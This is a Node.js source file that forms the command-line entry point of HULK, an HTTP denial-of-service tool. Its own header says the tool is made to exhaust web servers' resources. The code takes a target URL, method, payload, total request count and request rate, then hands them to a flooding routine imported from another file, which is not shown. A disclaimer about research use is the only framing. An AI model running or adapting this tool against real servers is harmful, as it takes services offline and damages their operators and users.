/*
		HULK v1.0.0
	https://github.com/siarheidudko/hulk
	(c) 2018 by Siarhei Dudko.
	https://github.com/siarheidudko/hulk/LICENSE
	
	Quotation of the original file:
	"This tool is a dos tool that is meant to put heavy load on HTTP servers in 
	order to bring them to their knees by exhausting the resource pool, 
	its is meant for research purposes only and any malicious usage of this tool is prohibited."
	Originaly (python) author :  Barry Shteiman - http://www.sectorix.com/2012/05/17/hulk-web-server-dos-tool/
	
	Rewritten with python (concept) under nodejs, optimized by Siarhei Dudko
	
*/

"use strict"

const hulkCore = require(__dirname + '/index.js').core;

module.exports.cli = function hulkCli(){
	/* link of DoS */
	var set_you_link='http://you_link.com/',
	/* data request */
	set_this_data = '',
	/* method request */
	set_this_method = 'GET',
	/* number of total requests */
	set_req_total = 20000,
	/* number of requests per minute */
	set_req_in_min = 10000;

	for(var i = 2; i < process.argv.length; i++){
		if(typeof(process.argv[i]) !== 'undefined'){
			if((process.argv.length === 7) || (i === 2)){
				var j = i;
			} else {
				var j = i + 1;
			}
			switch (j){
				case 2:
					set_you_link = process.argv[i];
					break;
				case 3:
					set_this_data = process.argv[i];
					break;
				case 4:
					set_this_method = process.argv[i];
					break;
				case 5:
					set_req_total = parseInt(process.argv[i], 10);
					break;
				case 6:
					set_req_in_min = parseInt(process.argv[i], 10);
					break;
			}
		}
	}
	
	if((typeof(set_you_link) !== 'string') || (typeof(set_this_data) !== 'string') || (typeof(set_this_method) !== 'string') || (typeof(set_req_total) !== 'number') || (typeof(set_req_in_min) !== 'number')) {
		throw 'Error argument';
	}

	hulkCore(set_you_link, set_this_data, set_this_method, set_req_total, set_req_in_min, console.log);
}